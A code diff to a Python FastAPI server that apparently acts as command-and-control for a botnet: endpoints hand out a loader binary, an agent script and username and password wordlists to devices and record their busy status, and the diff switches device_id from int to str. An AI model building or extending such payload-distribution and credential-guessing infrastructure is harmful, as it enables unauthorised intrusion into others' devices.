@@ -208,7 +208,7 @@ def get_tasks(device_id: str):
 '''
 
 @app.get("/payload/loader")
-def get_payload(device_id: int):
+def get_payload(device_id: str):
     binary_path = os.path.join(this_path, "../bin/loader_amd64")
     return FileResponse(
             path=binary_path,
@@ -217,7 +217,7 @@ def get_payload(device_id: int):
             )
 
 @app.get("/payload/agent")
-def get_payload(device_id: int):
+def get_payload(device_id: str):
     binary_path = os.path.join(this_path, "../device/agent.sh")
     return FileResponse(
             path=binary_path,
@@ -226,7 +226,7 @@ def get_payload(device_id: int):
             )
 
 @app.get("/wordlist/users")
-def get_payload(device_id: int):
+def get_payload(device_id: str):
     binary_path = os.path.join(this_path, "../src/testuser.txt")
     return FileResponse(
             path=binary_path,
@@ -235,7 +235,7 @@ def get_payload(device_id: int):
             )
 
 @app.get("/wordlist/passwords")
-def get_payload(device_id: int):
+def get_payload(device_id: str):
     binary_path = os.path.join(this_path, "../src/testpass.txt")
     return FileResponse(
             path=binary_path,
@@ -244,9 +244,9 @@ def get_payload(device_id: int):
             )
 
 @app.post("/busy")
-def post_busy(busystatus: int, device_id: int):
-    if device_id > 1:
-        device_id = 1
+def post_busy(busystatus: int, device_id: str):
+    if busystatus > 1:
+        busystatus = 1
 
     con = get_con()
     con.execute("""
